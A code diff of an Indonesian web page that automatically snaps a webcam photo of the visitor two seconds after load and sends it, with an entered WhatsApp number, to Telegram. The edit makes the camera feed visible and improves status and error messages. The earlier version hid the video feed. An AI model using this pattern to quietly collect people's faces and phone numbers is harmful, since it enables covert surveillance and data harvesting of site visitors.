@@ -2,11 +2,11 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Foto & Kirim Telegram</title>
+  <title>Auto Ambil Foto & Kirim ke Telegram</title>
 </head>
 <body>
-  <h2>Foto sedang diambil...</h2>
-  <video id="video" width="300" autoplay style="display:none;"></video>
+  <h2 id="status">Memuat kamera...</h2>
+  <video id="video" width="300" autoplay playsinline></video>
   <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
 
   <div id="formContainer" style="display:none;">
@@ -16,33 +16,41 @@
   </div>
 
   <script>
+    const status = document.getElementById('status');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
     let imageBlob = null;
 
-    // Akses kamera & ambil foto otomatis setelah 2 detik
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        setTimeout(() => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            imageBlob = blob;
-            document.getElementById('formContainer').style.display = 'block';
-            document.querySelector('h2').textContent = "Foto berhasil diambil.";
-          }, 'image/jpeg');
-        }, 2000); // 2 detik tunggu sebelum ambil foto
-      })
-      .catch(err => {
-        alert("Gagal mengakses kamera: " + err);
-      });
 
-    // Kirim ke Telegram
+        video.onloadedmetadata = () => {
+          status.textContent = "Mengambil foto...";
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+              imageBlob = blob;
+              status.textContent = "Foto berhasil diambil!";
+              document.getElementById('formContainer').style.display = 'block';
+            }, 'image/jpeg');
+          }, 2000); // Tunggu 2 detik sebelum ambil foto
+        };
+      } catch (err) {
+        status.textContent = "Gagal mengakses kamera. Pastikan kamu memberikan izin dan menggunakan HTTPS atau localhost.";
+        console.error("Kamera error:", err);
+      }
+    }
+
+    startCamera();
+
+    // Kirim ke Telegram saat tombol ditekan
     document.getElementById('send').addEventListener('click', () => {
       const waNumber = document.getElementById('waNumber').value.trim();
       if (!waNumber || !imageBlob) {
-        alert("Harap isi nomor WA dan pastikan foto berhasil diambil.");
+        alert("Masukkan nomor WhatsApp dan pastikan foto berhasil diambil.");
         return;
       }
 
@@ -57,10 +65,11 @@
       })
       .then(response => response.json())
       .then(data => {
-        alert("Berhasil dikirim ke Telegram!");
+        alert("Foto dan nomor berhasil dikirim ke Telegram!");
       })
       .catch(error => {
-        alert("Gagal kirim ke Telegram: " + error);
+        alert("Gagal mengirim ke Telegram: " + error);
+        console.error("Telegram error:", error);
       });
     });
   </script>
